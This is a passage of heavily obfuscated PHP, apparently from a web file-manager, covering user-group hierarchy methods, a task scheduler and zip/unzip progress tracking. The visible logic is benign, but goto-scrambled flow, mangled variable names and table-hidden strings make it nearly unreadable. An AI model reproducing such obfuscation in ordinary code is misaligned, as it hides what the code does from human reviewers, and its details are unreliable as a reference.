Cè©§œ‰éÎ; Cè©§œ‰éÎ: foreach ($C—°Ç±Üèä as &$fÄŸ“ç·ª³) { $fÄŸ“ç·ª³[$c¬‹Š²¾Øë[84]] = $fùğƒŠê—õ[$fÄŸ“ç·ª³[$c¬‹Š²¾Øë[1674]]] ? $fùğƒŠê—õ[$fÄŸ“ç·ª³[$c¬‹Š²¾Øë[1674]]] : array(); } unset($fÄŸ“ç·ª³); goto d—ˆ°¿í’¹; d—ˆ°¿í’¹: } protected function groupMerge($Fç–³Î¦›Ğ) { $Fç–³Î¦›Ğ = array_values(array_unique($Fç–³Î¦›Ğ)); $Båñ£µ  = array(); for ($Cœ§›çÉ÷ã = 0; $Cœ§›çÉ÷ã < count($Fç–³Î¦›Ğ); $Cœ§›çÉ÷ã++) { $C¶„ †‡¸ = !1; for ($f’Ä³ğÈ‹§ = 0; $f’Ä³ğÈ‹§ < count($Fç–³Î¦›Ğ); $f’Ä³ğÈ‹§++) { if ($Cœ§›çÉ÷ã == $f’Ä³ğÈ‹§) { continue; } if ($this->isParentOf($Fç–³Î¦›Ğ[$f’Ä³ğÈ‹§], $Fç–³Î¦›Ğ[$Cœ§›çÉ÷ã])) { $C¶„ †‡¸ = !0; break; } } if (!$C¶„ †‡¸) { $Båñ£µ [] = $Fç–³Î¦›Ğ[$Cœ§›çÉ÷ã]; } } return $Båñ£µ ; } protected function isParentOf($e¹áÀ™ìÍ, $F·µ™„è ) { goto bÇğ‡¯”; bÇ·ß„öÓÊ: return !1; goto dçŒ­é¦×‘; bÇğ‡¯”: $AõŠõÓç =& $_SERVER[ÉóçÄÇ]; if (!$e¹áÀ™ìÍ || !$F·µ™„è  || $e¹áÀ™ìÍ == $F·µ™„è ) { return !1; } $Dç½¦‰©‹á = $this->getInfoSimple($e¹áÀ™ìÍ); goto CöËé÷ïí‹; CöËé÷ïí‹: $c¡´ƒèæÍÃ = $this->getInfoSimple($F·µ™„è ); $a£‚î´ìõ› = $Dç½¦‰©‹á[$AõŠõÓç[481]] . $e¹áÀ™ìÍ . $AõŠõÓç[47]; if (substr($c¡´ƒèæÍÃ[$AõŠõÓç[481]], 0, strlen($a£‚î´ìõ›)) == $a£‚î´ìõ›) { return !0; } goto bÇ·ß„öÓÊ; dçŒ­é¦×‘: } public function groupShowRoot($F’ƒ“¬·§¹, $EËÒÇøáÛ™ = false) { goto DòÆôóÈî; b±‘ø‹£»Ä: return $f†íØ²ì§¥; goto cÂø´±¦–í; b“¿•œÊÂ: if ($EËÒÇøáÛ™ && count($DòçìÎ“©Ş) == 1) { return $f†íØ²ì§¥; } if (!$a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[439]] || !isset($a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[439]][$a”‡Ÿ­Š¼[1751]]) || $a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[439]][$a”‡Ÿ­Š¼[1751]] == $a”‡Ÿ­Š¼[1725]) { return $this->groupShowRoot($DòçìÎ“©Ş[count($DòçìÎ“©Ş) - 1], $EËÒÇøáÛ™); } if ($a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[439]][$a”‡Ÿ­Š¼[1751]] == $a”‡Ÿ­Š¼[355]) { $a”ÅóËòíŞ = explode($a”‡Ÿ­Š¼[47], $a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[439]][$a”‡Ÿ­Š¼[1752]]); if ($a”ÅóËòíŞ) { $f†íØ²ì§¥ = array_merge($f†íØ²ì§¥, $a”ÅóËòíŞ); } } goto b±‘ø‹£»Ä; DòÆôóÈî: $a”‡Ÿ­Š¼ =& $_SERVER[ÉóçÄÇ]; $a†Ê˜“–Ôù = $this->getInfo($F’ƒ“¬·§¹); if (!$a†Ê˜“–Ôù) { return array(); } goto C¶¾§¡°—±; C¶¾§¡°—±: $DòçìÎ“©Ş = $this->parentLevelArray($a†Ê˜“–Ôù[$a”‡Ÿ­Š¼[481]]); $f†íØ²ì§¥ = array($F’ƒ“¬·§¹); if (count($DòçìÎ“©Ş) == 0) { return $f†íØ²ì§¥; } goto b“¿•œÊÂ; cÂø´±¦–í: } protected function resetParentLevel() { $Fá‚»ñç¬ò =& $_SERVER[ÉóçÄÇ]; $cšã™‡Ó¡À = $Fá‚»ñç¬ò[1674]; $f±šôğ“ä = $this->select(); $f±šôğ“ä = array_to_keyvalue($f±šôğ“ä, $cšã™‡Ó¡À); foreach ($f±šôğ“ä as $f‰«¸¸£Ë‰) { goto a±÷±êÙï; F°¡‚Ññ‚±: $this->where(array($cšã™‡Ó¡À => $f‰«¸¸£Ë‰[$cšã™‡Ó¡À]))->save(array($Fá‚»ñç¬ò[548] => $E˜³³ºÓö§)); goto d×Äƒ‘¹; a±÷±êÙï: $bÃßØç±èÚ = $f‰«¸¸£Ë‰; $E˜³³ºÓö§ = array(); while ($bÃßØç±èÚ[$Fá‚»ñç¬ò[472]] != 0) { $E˜³³ºÓö§[] = $bÃßØç±èÚ[$Fá‚»ñç¬ò[472]]; $bÃßØç±èÚ = $f±šôğ“ä[$bÃßØç±èÚ[$Fá‚»ñç¬ò[472]]]; } goto bØ‚¸Â•‹§; bØ‚¸Â•‹§: $E˜³³ºÓö§[] = 0; $E˜³³ºÓö§ = $Fá‚»ñç¬ò[47] . implode($Fá‚»ñç¬ò[47], array_reverse($E˜³³ºÓö§)) . $Fá‚»ñç¬ò[47]; $this->setNamePinyin($f‰«¸¸£Ë‰[$cšã™‡Ó¡À], $f‰«¸¸£Ë‰[$Fá‚»ñç¬ò[28]]); goto F°¡‚Ññ‚±; d×Äƒ‘¹: } return $f±šôğ“ä; } public function groupNameAuto($aã¦ ğª¹ô, $c¹çö¯…áì) { $b‘Ñ¬ÊİŠÙ =& $_SERVER[ÉóçÄÇ]; $Eí¢éĞŸÑØ = $this->where(array($b‘Ñ¬ÊİŠÙ[389] => $aã¦ ğª¹ô))->getField($b‘Ñ¬ÊİŠÙ[28], !0); if (!$Eí¢éĞŸÑØ || !in_array($c¹çö¯…áì, $Eí¢éĞŸÑØ)) { return $c¹çö¯…áì; } for ($a„½Ö¦äÏà = 1; $a„½Ö¦äÏà <= count($Eí¢éĞŸÑØ) + 1; $a„½Ö¦äÏà++) { $cÊÁ÷ÅÆŠœ = $c¹çö¯…áì . "\x28{$a„½Ö¦äÏà}\51"; if (!in_array($cÊÁ÷ÅÆŠœ, $Eí¢éĞŸÑØ)) { return $cÊÁ÷ÅÆŠœ; } } } public function groupSwitch($A—ñÊƒ‰•, $DÎ¼µêæÆº) { goto EŒÍæù¿¼Û; a¦¥‰¿ÁáÕ: $fº‘£Àø–„ = Model($B‚‘÷Ğ¯¨è[1756])->where($AÑ™Ğ’»ºŠ)->select(); if (!$fº‘£Àø–„) { $fº‘£Àø–„ = array(); } foreach ($fº‘£Àø–„ as $Bª¨¢çÆª›) { $FŸ÷±§ĞŒÀ = $Bª¨¢çÆª›[$B‚‘÷Ğ¯¨è[1511]]; $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[1511] => $FŸ÷±§ĞŒÀ, $B‚‘÷Ğ¯¨è[1674] => $DÎ¼µêæÆº); $cçÒÌˆÃ†ù = Model($B‚‘÷Ğ¯¨è[1756])->where($AÑ™Ğ’»ºŠ)->find(); if (!$cçÒÌˆÃ†ù) { $fİƒƒ¬Ããİ = array($DÎ¼µêæÆº => $Bª¨¢çÆª›[$B‚‘÷Ğ¯¨è[1770]]); Model($B‚‘÷Ğ¯¨è[501])->userGroupAdd($FŸ÷±§ĞŒÀ, $fİƒƒ¬Ããİ); } Model($B‚‘÷Ğ¯¨è[501])->userGroupRemove($FŸ÷±§ĞŒÀ, $A—ñÊƒ‰•); } goto Cï¤àÒ„‰Ñ; bëì¾–Ó‡: $eéŒ’ÎÓ™º = !empty($A¾İ„Ì°Åš[$A—ñÊƒ‰•]) ? $A¾İ„Ì°Åš[$A—ñÊƒ‰•] : !1; if ($eéŒ’ÎÓ™º) { goto e¬àŠ÷˜ä¹; AºªÙ„‘‰: $A¾İ„Ì°Åš = Model($B‚‘÷Ğ¯¨è[776])->where($AÑ™Ğ’»ºŠ)->field($B‚‘÷Ğ¯¨è[1772])->select(); if (!$A¾İ„Ì°Åš) { $A¾İ„Ì°Åš = array(); } Model($B‚‘÷Ğ¯¨è[776])->moveClearAuth = !1; goto aòÁÙÁá÷‘; e¬àŠ÷˜ä¹: if (!$A¾İ„Ì°Åš[$DÎ¼µêæÆº]) { $A¾İ„Ì°Åš[$DÎ¼µêæÆº] = Model($B‚‘÷Ğ¯¨è[776])->groupRootAdd($DÎ¼µêæÆº); } $eˆÚ­‚ˆ­ˆ = $A¾İ„Ì°Åš[$DÎ¼µêæÆº]; $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[472] => $eéŒ’ÎÓ™º); goto AºªÙ„‘‰; aòÁÙÁá÷‘: foreach ($A¾İ„Ì°Åš as $f¥ƒ«©àĞÖ) { $bù®æŞµœ› = $f¥ƒ«©àĞÖ[$B‚‘÷Ğ¯¨è[397]] == $B‚‘÷Ğ¯¨è[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($B‚‘÷Ğ¯¨è[776])->move($f¥ƒ«©àĞÖ[$B‚‘÷Ğ¯¨è[390]], $eˆÚ­‚ˆ­ˆ, $bù®æŞµœ›); } Model($B‚‘÷Ğ¯¨è[776])->moveClearAuth = !0; $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[398] => 2, $B‚‘÷Ğ¯¨è[478] => $A—ñÊƒ‰•); goto e‡ÁñÁá; e‡ÁñÁá: $Añ³ÏÛÙ = array($B‚‘÷Ğ¯¨è[478] => $DÎ¼µêæÆº); Model($B‚‘÷Ğ¯¨è[1773])->where($AÑ™Ğ’»ºŠ)->save($Añ³ÏÛÙ); Model($B‚‘÷Ğ¯¨è[1774])->where($AÑ™Ğ’»ºŠ)->save($Añ³ÏÛÙ); goto e¤”æÅ¹¹É; e¤”æÅ¹¹É: } $this->_changeChildLevel($añ ù³µîÉ[$A—ñÊƒ‰•], $añ ù³µîÉ[$DÎ¼µêæÆº], !0); goto FğËÑîÕÅ; b£­¶’«Ê…: $añ ù³µîÉ = array_to_keyvalue($añ ù³µîÉ, $B‚‘÷Ğ¯¨è[1674]); if (!isset($añ ù³µîÉ[$A—ñÊƒ‰•]) || !isset($añ ù³µîÉ[$DÎ¼µêæÆº]) || $añ ù³µîÉ[$A—ñÊƒ‰•][$B‚‘÷Ğ¯¨è[472]] == 0) { return !1; } $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[1674] => $A—ñÊƒ‰•); goto a¦¥‰¿ÁáÕ; FğËÑîÕÅ: $this->where(array($B‚‘÷Ğ¯¨è[472] => $A—ñÊƒ‰•))->save(array($B‚‘÷Ğ¯¨è[472] => $DÎ¼µêæÆº)); return !0; goto d¢¹İ®’Ê; EŒÍæù¿¼Û: $B‚‘÷Ğ¯¨è =& $_SERVER[ÉóçÄÇ]; $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[1674] => array($B‚‘÷Ğ¯¨è[7], array($A—ñÊƒ‰•, $DÎ¼µêæÆº))); $añ ù³µîÉ = $this->where($AÑ™Ğ’»ºŠ)->select(); goto b£­¶’«Ê…; Cï¤àÒ„‰Ñ: $AÑ™Ğ’»ºŠ = array($B‚‘÷Ğ¯¨è[398] => 2, $B‚‘÷Ğ¯¨è[472] => 0, $B‚‘÷Ğ¯¨è[397] => 1, $B‚‘÷Ğ¯¨è[478] => array($B‚‘÷Ğ¯¨è[7], array($A—ñÊƒ‰•, $DÎ¼µêæÆº))); $A¾İ„Ì°Åš = Model($B‚‘÷Ğ¯¨è[776])->where($AÑ™Ğ’»ºŠ)->field($B‚‘÷Ğ¯¨è[1771])->select(); $A¾İ„Ì°Åš = array_to_keyvalue($A¾İ„Ì°Åš, $B‚‘÷Ğ¯¨è[478], $B‚‘÷Ğ¯¨è[390]); goto bëì¾–Ó‡; d¢¹İ®’Ê: } } goto FçÑõùˆ; DÉÇß˜ÌŸ›: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($B¶«³‘Ò„§, $aÊ—§Ãº„¦ = 5.0) { if (!$B¶«³‘Ò„§) { return; } $eğˆ£Ï¤ª = Cache::get($B¶«³‘Ò„§); if (!$eğˆ£Ï¤ª || timeFloat() - floatVal($eğˆ£Ï¤ª) >= $aÊ—§Ãº„¦) { Cache::set($B¶«³‘Ò„§, timeFloat(), $aÊ—§Ãº„¦ * 10); return !0; } return !1; } public static function timeLimitCall($CŠİ×—Á‰ø, $B½—…‡²°°, $Bºššï‡ˆ”, $fÁé¡ëÄäÖ = 5.0) { goto eï¡—æÆ’; eï¡—æÆ’: $Dƒåê•Î¿ =& $_SERVER[ÉóçÄÇ]; if (!$CŠİ×—Á‰ø || !$B½—…‡²°°) { return; } self::$asyncAdd = !0; goto b¢¥‹õ¶™§; dƒ—òÓÍèŒ: Cache::set($A…Á ³ö¢Ä, $b®³”–¥æ, 60); Cache::removeMemory($A…Á ³ö¢Ä); write_log($Dƒåê•Î¿[1588] . $CŠİ×—Á‰ø . $Dƒåê•Î¿[67] . $B½—…‡²°°, $Dƒåê•Î¿[1582]); goto f‹É••´ÀÕ; B¢Ë‡Îƒ©: if (is_array($b®³”–¥æ[$CŠİ×—Á‰ø])) { $Cğ½ÄÔõèÔ[$Dƒåê•Î¿[1587]] = $b®³”–¥æ[$CŠİ×—Á‰ø][$Dƒåê•Î¿[1587]]; } if (is_array($b®³”–¥æ[$CŠİ×—Á‰ø])) { if (timeFloat() - $b®³”–¥æ[$CŠİ×—Á‰ø][$Dƒåê•Î¿[1586]] < $Cğ½ÄÔõèÔ[$Dƒåê•Î¿[195]] * 0.3) { return; } $Cğ½ÄÔõèÔ[$Dƒåê•Î¿[1587]] = $b®³”–¥æ[$CŠİ×—Á‰ø][$Dƒåê•Î¿[1587]]; } $b®³”–¥æ[$CŠİ×—Á‰ø] = $Cğ½ÄÔõèÔ; goto dƒ—òÓÍèŒ; b¢¥‹õ¶™§: $A…Á ³ö¢Ä = $Dƒåê•Î¿[1585]; $b®³”–¥æ = Cache::get($A…Á ³ö¢Ä, !0); $Cğ½ÄÔõèÔ = array($Dƒåê•Î¿[1586] => timeFloat(), $Dƒåê•Î¿[1587] => timeFloat(), $Dƒåê•Î¿[260] => $B½—…‡²°°, $Dƒåê•Î¿[1580] => $Bºššï‡ˆ”, $Dƒåê•Î¿[195] => $fÁé¡ëÄäÖ); goto B¢Ë‡Îƒ©; f‹É••´ÀÕ: } public static function timeLimitCallLoop() { goto E³Ò—’—İª; a¸½èé¿ºÂ: if (!$fá‹—Ğ‰´é) { return Cache::remove($FßâÚÓ­„Î); } Cache::set($FßâÚÓ­„Î, $fá‹—Ğ‰´é, 60); Cache::removeMemory($FßâÚÓ­„Î); goto e©ùƒø; E³Ò—’—İª: $E¿ÄßÓäæ =& $_SERVER[ÉóçÄÇ]; $dº’…Ú–©ƒ = array($E¿ÄßÓäæ[1589]); $b”‰„ïœÇ¯ = in_array(strtolower(ACTION), $dº’…Ú–©ƒ); goto bŠ÷³ò¡°; AĞÍ…•÷öÚ: if (!$BÎ‘§Š®áº || count($BÎ‘§Š®áº) <= 0) { return; } $fƒ’‘Í±´á = !1; $Bíì“±ËÊ = timeFloat(); goto aŠÎêÄŒ¥×; bŠ÷³ò¡°: if (!$b”‰„ïœÇ¯ && !self::$asyncAdd) { return; } $FßâÚÓ­„Î = $E¿ÄßÓäæ[1585]; $BÎ‘§Š®áº = Cache::get($FßâÚÓ­„Î, !0); goto AĞÍ…•÷öÚ; aŠÎêÄŒ¥×: $fá‹—Ğ‰´é = array(); foreach ($BÎ‘§Š®áº as $d«˜“ŠåÍ => $Dìô¸²¯†) { if ($Bíì“±ËÊ - $Dìô¸²¯†[$E¿ÄßÓäæ[1587]] > $Dìô¸²¯†[$E¿ÄßÓäæ[195]]) { $fƒ’‘Í±´á = !0; try { Hook::apply($Dìô¸²¯†[$E¿ÄßÓäæ[260]], $Dìô¸²¯†[$E¿ÄßÓäæ[1580]]); write_log($E¿ÄßÓäæ[1590] . $d«˜“ŠåÍ . $E¿ÄßÓäæ[67] . $Dìô¸²¯†[$E¿ÄßÓäæ[260]] . $E¿ÄßÓäæ[1591] . ACTION, $E¿ÄßÓäæ[1582]); } catch (Exception $A‰ë•«ëÒŞ) { } continue; } $fá‹—Ğ‰´é[$d«˜“ŠåÍ] = $Dìô¸²¯†; } if (!$fƒ’‘Í±´á) { return; } goto a¸½èé¿ºÂ; e©ùƒø: } public static function finished($C»•ŠóĞ¦Æ, $Få¦óšÙÚ³) { $Cå¤êÏ‘Åº =& $_SERVER[ÉóçÄÇ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Cå¤êÏ‘Åº[260] => $C»•ŠóĞ¦Æ, $Cå¤êÏ‘Åº[1580] => $Få¦óšÙÚ³); } private static function finishedRun() { $eÀ­àìù¤× =& $_SERVER[ÉóçÄÇ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $E§ßßÁ®§•) { try { Hook::apply($E§ßßÁ®§•[$eÀ­àìù¤×[260]], $E§ßßÁ®§•[$eÀ­àìù¤×[1580]]); } catch (Exception $EĞí‚‚¯Ì) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto BµğŒø¡â; F¿ÈªÈòÓí: Hook::bind($bí¯¡Ñ¢ƒœ[1071], array($this, $bí¯¡Ñ¢ƒœ[1594])); $E÷–šëïß =& $this->task; $E÷–šëïß[$bí¯¡Ñ¢ƒœ[1595]] = $bí¯¡Ñ¢ƒœ[1076]; goto eØªä‹¦ˆÓ; eØªä‹¦ˆÓ: if (!$E÷–šëïß[$bí¯¡Ñ¢ƒœ[1414]]) { $E÷–šëïß[$bí¯¡Ñ¢ƒœ[1414]] = LNG($bí¯¡Ñ¢ƒœ[1596]); } goto C¿µï‰‘ìÒ; BµğŒø¡â: $bí¯¡Ñ¢ƒœ =& $_SERVER[ÉóçÄÇ]; parent::startAfter(); Hook::bind($bí¯¡Ñ¢ƒœ[1592], array($this, $bí¯¡Ñ¢ƒœ[1593])); goto F¿ÈªÈòÓí; C¿µï‰‘ìÒ: } protected function endAfter() { $d·¸µ¼¼Ãœ =& $_SERVER[ÉóçÄÇ]; parent::endAfter(); Hook::unbind($d·¸µ¼¼Ãœ[1592], array($this, $d·¸µ¼¼Ãœ[1593])); Hook::unbind($d·¸µ¼¼Ãœ[1071], array($this, $d·¸µ¼¼Ãœ[1594])); } public function updateAfter() { $fà¨¥¼Ôìì =& $_SERVER[ÉóçÄÇ]; $Bö¬ô‡… =& $this->task; if (!$Bö¬ô‡…[$fà¨¥¼Ôìì[1004]] || !$Bö¬ô‡…[$fà¨¥¼Ôìì[720]]) { return; } if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1595]] == $fà¨¥¼Ôìì[1076]) { $cÏŒ‰º«Í = 0; if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1554]]) { $cÏŒ‰º«Í = $Bö¬ô‡…[$fà¨¥¼Ôìì[1555]] / $Bö¬ô‡…[$fà¨¥¼Ôìì[1554]]; } $Bö¬ô‡…[$fà¨¥¼Ôìì[1512]] = $cÏŒ‰º«Í * 0.3; } else { if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1595]] == $fà¨¥¼Ôìì[309]) { $cÏŒ‰º«Í = $Bö¬ô‡…[$fà¨¥¼Ôìì[1018]] / $Bö¬ô‡…[$fà¨¥¼Ôìì[1004]]; $Bö¬ô‡…[$fà¨¥¼Ôìì[1512]] = 0.3 + $cÏŒ‰º«Í * 0.4; } else { if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1595]] == $fà¨¥¼Ôìì[106]) { $E†²ÌÑÖ‡ß = 0; if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1556]] == $fà¨¥¼Ôìì[106]) { $E†²ÌÑÖ‡ß = $Bö¬ô‡…[$fà¨¥¼Ôìì[1555]]; } $cÏŒ‰º«Í = ($Bö¬ô‡…[$fà¨¥¼Ôìì[1559]] + $E†²ÌÑÖ‡ß) / $Bö¬ô‡…[$fà¨¥¼Ôìì[720]]; $Bö¬ô‡…[$fà¨¥¼Ôìì[1512]] = 0.3 + 0.4 + $cÏŒ‰º«Í * 0.3; } } } if ($Bö¬ô‡…[$fà¨¥¼Ôìì[1512]] > 0) { $añº§ö¨„ª = timeFloat() - $Bö¬ô‡…[$fà¨¥¼Ôìì[742]] - $Bö¬ô‡…[$fà¨¥¼Ôìì[1515]]; $Bö¬ô‡…[$fà¨¥¼Ôìì[1516]] = $añº§ö¨„ª * (1 - $Bö¬ô‡…[$fà¨¥¼Ôìì[1512]]) / $Bö¬ô‡…[$fà¨¥¼Ôìì[1512]]; } } public function addFile($BâìµÂÒ«) { goto cƒ¤ó÷˜ğ³; cƒ¤ó÷˜ğ³: $EÓÍİÜ¿º =& $_SERVER[ÉóçÄÇ]; $døßğÌéÌ =& $this->task; $C¥‡–¥Ä = IO::info($BâìµÂÒ«); goto Có¤Å ¼Ë; Bší°ºïÇô: $this->update(); goto D±éÒ‡Ò¨ˆ; Có¤Å ¼Ë: $døßğÌéÌ[$EÓÍİÜ¿º[1552]] = $C¥‡–¥Ä[$EÓÍİÜ¿º[28]]; $døßğÌéÌ[$EÓÍİÜ¿º[1554]] = $C¥‡–¥Ä[$EÓÍİÜ¿º[77]]; $døßğÌéÌ[$EÓÍİÜ¿º[1555]] = 0; goto F²¯±´ ©„; F²¯±´ ©„: $døßğÌéÌ[$EÓÍİÜ¿º[1006]] = $EÓÍİÜ¿º[1571]; $døßğÌéÌ[$EÓÍİÜ¿º[1556]] = $EÓÍİÜ¿º[1076]; $døßğÌéÌ[$EÓÍİÜ¿º[720]] = $C¥‡–¥Ä[$EÓÍİÜ¿º[77]]; goto dèğ »ÛÃ; dèğ »ÛÃ: $døßğÌéÌ[$EÓÍİÜ¿º[1004]] = 1; $aŒòƒ§ßì = 0; $døßğÌéÌ[$EÓÍİÜ¿º[1563]] = array($EÓÍİÜ¿º[1564] => $aŒòƒ§ßì + 1, $EÓÍİÜ¿º[407] => $C¥‡–¥Ä[$EÓÍİÜ¿º[28]], $EÓÍİÜ¿º[75] => $C¥‡–¥Ä[$EÓÍİÜ¿º[75]], $EÓÍİÜ¿º[489] => $C¥‡–¥Ä[$EÓÍİÜ¿º[489]] ? $C¥‡–¥Ä[$EÓÍİÜ¿º[489]] : $C¥‡–¥Ä[$EÓÍİÜ¿º[75]]); goto Bší°ºïÇô; D±éÒ‡Ò¨ˆ: } public function unzipAfter($BìÕ÷ò×È) { goto AØ»±ÁŸÎ; fõùÓó°Ê: $this->update(); self::log($a©ËÙÄ¼…ù[1597] . json_encode(array($Cê÷ Á”Å, $dÌìàğóµã))); goto dôˆ˜™…å; cˆ³ïÓ•‡: $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1552]] = $a©ËÙÄ¼…ù[33]; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1559]] = 0; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[720]] = $dÌìàğóµã[$a©ËÙÄ¼…ù[77]]; goto fõùÓó°Ê; AØ»±ÁŸÎ: $a©ËÙÄ¼…ù =& $_SERVER[ÉóçÄÇ]; $Cê÷ Á”Å =& $this->task; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1595]] = $a©ËÙÄ¼…ù[106]; goto bµ‰Úó÷¹œ; f¨¹ßóÃ¦: if ($dÌìàğóµã[$a©ËÙÄ¼…ù[29]] == $a©ËÙÄ¼…ù[173]) { $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1004]] = 1; } else { $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1004]] = $dÌìàğóµã[$a©ËÙÄ¼…ù[80]][$a©ËÙÄ¼…ù[78]]; } $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1006]] = $a©ËÙÄ¼…ù[33]; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1556]] = 0; goto eÓ”ÓöÁåÇ; eÓ”ÓöÁåÇ: $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1018]] = 0; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1554]] = 0; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1555]] = 0; goto cˆ³ïÓ•‡; bµ‰Úó÷¹œ: $dÌìàğóµã = IO::infoWithChildren($BìÕ÷ò×È); $b±îç£¢à = 0; $Cê÷ Á”Å[$a©ËÙÄ¼…ù[1563]] = array($a©ËÙÄ¼…ù[1564] => $b±îç£¢à + 1, $a©ËÙÄ¼…ù[407] => $dÌìàğóµã[$a©ËÙÄ¼…ù[28]], $a©ËÙÄ¼…ù[75] => $dÌìàğóµã[$a©ËÙÄ¼…ù[75]], $a©ËÙÄ¼…ù[489] => $dÌìàğóµã[$a©ËÙÄ¼…ù[489]] ? $dÌìàğóµã[$a©ËÙÄ¼…ù[489]] : $dÌìàğóµã[$a©ËÙÄ¼…ù[75]]); goto f¨¹ßóÃ¦; dôˆ˜™…å: } public function nameParse($cäÀèë§¦®) { goto Eİ§««Ìï¥; Eİ§««Ìï¥: $DÓ›‘Û‹¨ =& $_SERVER[ÉóçÄÇ]; $d°Šİà =& $this->task; if ($d°Šİà[$DÓ›‘Û‹¨[1595]] == $DÓ›‘Û‹¨[1076]) { $d°Šİà[$DÓ›‘Û‹¨[1595]] = $DÓ›‘Û‹¨[309]; $d°Šİà[$DÓ›‘Û‹¨[1559]] = 0; $d°Šİà[$DÓ›‘Û‹¨[720]] = 0; } goto bŞ¢™ÉâÆ×; bŞ¢™ÉâÆ×: $FÑØ»´¾ÜÅ = get_path_this($cäÀèë§¦®); if (strstr($FÑØ»´¾ÜÅ, $DÓ›‘Û‹¨[94])) { $d°Šİà[$DÓ›‘Û‹¨[1018]] += 1; $d°Šİà[$DÓ›‘Û‹¨[1004]] += 1; } $d°Šİà[$DÓ›‘Û‹¨[1552]] = $cäÀèë§¦®; goto B†İÎÅæ³¢; B†İÎÅæ³¢: $this->update(); goto a²áÈšæ; a²áÈšæ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $eæ·•…ñäŠ =& $_SERVER[ÉóçÄÇ]; parent::startAfter(); Hook::bind($eæ·•…ñäŠ[1598], array($this, $eæ·•…ñäŠ[1593])); $eßñµâÁ– =& $this->task; $eßñµâÁ–[$eæ·•…ñäŠ[1595]] = $eæ·•…ñäŠ[1076]; if (!$eßñµâÁ–[$eæ·•…ñäŠ[1414]]) { $eßñµâÁ–[$eæ·•…ñäŠ[1414]] = LNG($eæ·•…ñäŠ[1599]); } } protected function endAfter() { $CƒÙÀ˜ƒäŞ =& $_SERVER[ÉóçÄÇ]; parent::endAfter(); Hook::unbind($CƒÙÀ˜ƒäŞ[1598], array($this, $CƒÙÀ˜ƒäŞ[1593])); } public function updateAfter() { $F¼§×æİå¦ =& $_SERVER[ÉóçÄÇ]; $böÒè ÊŒÍ =& $this->task; if (!$böÒè ÊŒÍ[$F¼§×æİå¦[1004]] || !$böÒè ÊŒÍ[$F¼§×æİå¦[720]]) { return; } if ($böÒè ÊŒÍ[$F¼§×æİå¦[1595]] == $F¼§×æİå¦[1076]) { $e±’ä£‚¦ = $böÒè ÊŒÍ[$F¼§×æİå¦[1555]]; if ($böÒè ÊŒÍ[$F¼§×æİå¦[1556]] != $F¼§×æİå¦[1076]) { $e±’ä£‚¦ = 0; } $A™‚êÊË°Ò = ($böÒè ÊŒÍ[$F¼§×æİå¦[1559]] + $e±’ä£‚¦) / $böÒè ÊŒÍ[$F¼§×æİå¦[720]]; $böÒè ÊŒÍ[$F¼§×æİå¦[1512]] = $A™‚êÊË°Ò * 0.3; } else { if ($böÒè ÊŒÍ[$F¼§×æİå¦[1595]] == $F¼§×æİå¦[309]) { $A™‚êÊË°Ò = $böÒè ÊŒÍ[$F¼§×æİå¦[1018]] / $böÒè ÊŒÍ[$F¼§×æİå¦[1004]]; $böÒè ÊŒÍ[$F¼§×æİå¦[1512]] = 0.3 + $A™‚êÊË°Ò * 0.5; } else { if ($böÒè ÊŒÍ[$F¼§×æİå¦[1595]] == $F¼§×æİå¦[106]) { $A™‚êÊË°Ò = 0; if ($böÒè ÊŒÍ[$F¼§×æİå¦[1554]]) { $A™‚êÊË°Ò = $böÒè ÊŒÍ[$F¼§×æİå¦[1555]] / $böÒè ÊŒÍ[$F¼§×æİå¦[1554]]; } $böÒè ÊŒÍ[$F¼§×æİå¦[1512]] = 0.3 + 0.5 + $A™‚êÊË°Ò * 0.2; } } } if ($böÒè ÊŒÍ[$F¼§×æİå¦[1512]] > 0) { $c£¹¼ğ ±ƒ = timeFloat() - $böÒè ÊŒÍ[$F¼§×æİå¦[742]] - $böÒè ÊŒÍ[$F¼§×æİå¦[1515]]; $böÒè ÊŒÍ[$F¼§×æİå¦[1516]] = $c£¹¼ğ ±ƒ * (1 - $böÒè ÊŒÍ[$F¼§×æİå¦[1512]]) / $böÒè ÊŒÍ[$F¼§×æİå¦[1512]]; } } public function copyFileStart($aŒ”Æ¶Ç¹, $d»·ÚÛÍ¾ß, $e¯ğ©è¬ª, $AÈ‹ÎÙ„ñ, $aÄ·ƒğ”Â…, $B´çÓ¾Š‚) { $BƒÔ­˜— =& $_SERVER[ÉóçÄÇ]; parent::copyFileStart($aŒ”Æ¶Ç¹, $d»·ÚÛÍ¾ß, $e¯ğ©è¬ª, $AÈ‹ÎÙ„ñ, $aÄ·ƒğ”Â…, $B´çÓ¾Š‚); $d ë¤Í¿ =& $this->task; if ($d ë¤Í¿[$BƒÔ­˜—[1595]] == 